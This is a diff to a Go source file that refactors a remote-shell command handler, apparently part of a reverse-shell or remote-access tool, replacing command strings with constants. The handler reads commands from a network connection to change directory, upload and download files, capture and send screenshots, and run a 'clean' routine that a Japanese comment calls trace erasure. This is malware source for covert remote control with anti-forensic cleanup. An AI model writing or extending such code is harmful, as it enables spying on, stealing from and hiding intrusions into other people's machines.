@@ -11,6 +11,14 @@ import (
 	"strings"
 )
 
+const (
+	CHANGE_DIR  string = "cd"
+	UPLOAD      string = "upload"
+	SCREEN_SHOT string = "screenshot"
+	DOWNLOAD    string = "download"
+	CLEAN       string = "clean_sh"
+)
+
 func RunShell(conn net.Conn) error {
 	defer conn.Close()
 
@@ -31,7 +39,7 @@ func RunShell(conn net.Conn) error {
 
 		//コマンドの引数の数もチェックすること
 		switch commands[0] {
-		case "cd":
+		case CHANGE_DIR:
 			if len(commands) != 2 {
 				//message
 				log.Println(err)
@@ -40,7 +48,7 @@ func RunShell(conn net.Conn) error {
 			dir := commands[len(commands)-1]
 			os.Chdir(string(dir))
 
-		case "upload":
+		case UPLOAD:
 			if len(commands) != 2 {
 				//message
 				log.Println(err)
@@ -54,7 +62,7 @@ func RunShell(conn net.Conn) error {
 				continue
 			}
 
-		case "screenshot": //ex: screenshot
+		case SCREEN_SHOT: //ex: screenshot
 			//スクリーンショットを撮影し送信
 			outdir := config.Config.ScreenshotDir
 
@@ -72,7 +80,7 @@ func RunShell(conn net.Conn) error {
 
 			fmt.Println("screenshot finished")
 
-		case "download": //ex: download [path]
+		case DOWNLOAD: //ex: download [path]
 			//execDownload
 			if len(commands) != 2 {
 				//message
@@ -88,7 +96,7 @@ func RunShell(conn net.Conn) error {
 				log.Println(err)
 			}
 
-		case "clean_sh": //痕跡消去 ex: clean_go_reversh
+		case CLEAN: //痕跡消去 ex: clean_go_reversh
 			//execCleanSh
 			fmt.Println("CLEAN")
 
